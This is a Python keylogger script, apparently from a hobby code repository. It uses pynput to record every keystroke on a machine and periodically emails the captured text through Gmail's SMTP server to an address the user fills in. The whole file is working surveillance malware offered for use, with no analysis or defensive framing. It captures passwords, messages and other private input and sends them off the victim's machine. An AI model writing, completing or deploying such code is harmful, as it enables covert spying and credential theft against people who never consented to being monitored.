import smtplib

from pynput.keyboard import Key, Listener


email = '...'  # Enter your gmail(important!)
password = '...'  # Enter your gmail password
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)


full_log = ''
word = ''
email_char_limit = 10  # Number of saved characters to send an email


def on_press(key):
    global word
    global full_log
    global email
    global email_char_limit

    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) >= email_char_limit:
            send_log()
            full_log = ''
    elif key == Key.shift_l or key == Key.shift_r:  # Sometimes this 2 lines can crush the programm
        return                                      # In this case just delete them.
    elif key == key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char

    if key == Key.esc:
        return False


def send_log():
    """Sending a log to your email.
       In this example i used the same email to send
       and recieve logs.
    """
    server.sendmail(
        email,  # from:
        email,  # to:
        full_log
    )


with Listener(on_press=on_press) as listener:
    listener.join()
